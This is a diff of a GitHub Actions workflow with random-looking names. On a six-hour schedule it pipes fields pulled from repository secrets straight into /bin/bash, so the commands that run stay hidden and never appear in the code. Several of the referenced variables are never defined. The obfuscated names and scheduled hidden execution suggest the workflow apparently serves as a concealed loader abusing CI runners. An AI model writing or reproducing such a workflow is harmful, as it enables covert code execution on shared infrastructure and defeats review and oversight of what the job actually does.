@@ -1,22 +1,21 @@
 name: zhangcongrong6247
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
+    - cron: '22 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangcongrong6247
         env:
-          bwqo26: ${{ secrets.bwqo26 }}
+          auf4: ${{ secrets.auf4 }}
         run: |
-          echo $bwqo26 | jq -r .edi046 | /bin/bash
-          echo $rfr82 | jq -r .dpbnf1278 | /bin/bash
-          echo $kezny4 | jq -r .kcaq729 | /bin/bash
-          echo $parkr11283 | jq -r .dx8629 | /bin/bash
-          echo $awjvq482 | jq -r .ql071 | /bin/bash
+          echo $auf4 | jq -r .evrms50308 | /bin/bash
+          echo $kdv16665 | jq -r .vb98249 | /bin/bash
+          echo $bxv25 | jq -r .plxr5 | /bin/bash
+          echo $tswsw91895 | jq -r .ggozs10 | /bin/bash
 
